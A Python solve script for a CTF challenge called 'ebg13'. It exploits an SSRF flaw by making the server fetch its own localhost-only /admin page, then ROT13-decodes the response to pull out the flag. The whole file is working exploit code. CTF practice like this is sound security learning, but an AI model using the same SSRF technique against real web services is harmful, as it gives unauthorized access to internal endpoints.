#!/usr/bin/env python3
"""
Solution for the ebg13 CTF challenge.

The challenge has an SSRF vulnerability:
1. The /ebj13 endpoint fetches any URL without proper validation
2. The /admin endpoint returns the flag only if accessed from localhost
3. We can use /ebj13 to make the server fetch /admin from localhost
4. The response is ROT13 encoded, so we need to decode it
"""

import requests
import re
import sys


def rot13(text):
    """Decode ROT13 encoded text."""
    result = []
    for char in text:
        if 'a' <= char <= 'z':
            result.append(chr((ord(char) - ord('a') + 13) % 26 + ord('a')))
        elif 'A' <= char <= 'Z':
            result.append(chr((ord(char) - ord('A') + 13) % 26 + ord('A')))
        else:
            result.append(char)
    return ''.join(result)


def solve(base_url):
    """Solve the challenge by exploiting SSRF."""
    print(f"[*] Targeting: {base_url}")
    
    # Exploit SSRF: make the server fetch /admin from localhost
    # The server will see it as localhost, so it will return the flag
    admin_url = "http://127.0.0.1:3000/admin"
    target_url = f"{base_url}/ebj13?url={admin_url}"
    
    print(f"[*] Making SSRF request to: {target_url}")
    
    try:
        response = requests.get(target_url, timeout=10)
        response.raise_for_status()
        
        print(f"[*] Received response (length: {len(response.text)})")
        
        # The response is ROT13 encoded, so we need to decode it
        decoded = rot13(response.text)
        
        # Extract the flag using regex
        flag_pattern = r'bctf\{[^}]+\}'
        matches = re.findall(flag_pattern, decoded)
        
        if matches:
            print(f"[+] Found flag: {matches[0]}")
            return matches[0]
        else:
            print("[-] Flag not found in response")
            print(f"[*] Decoded response preview:\n{decoded[:500]}")
            return None
            
    except requests.exceptions.RequestException as e:
        print(f"[-] Error: {e}")
        return None


if __name__ == "__main__":
    # Default to localhost if no URL provided
    base_url = sys.argv[1] if len(sys.argv) > 1 else "https://ebg13.challs.pwnoh.io/"
    
    flag = solve(base_url)
    
    if flag:
        print(f"\n[+] Success! Flag: {flag}")
        sys.exit(0)
    else:
        print("\n[-] Failed to retrieve flag")
        sys.exit(1)

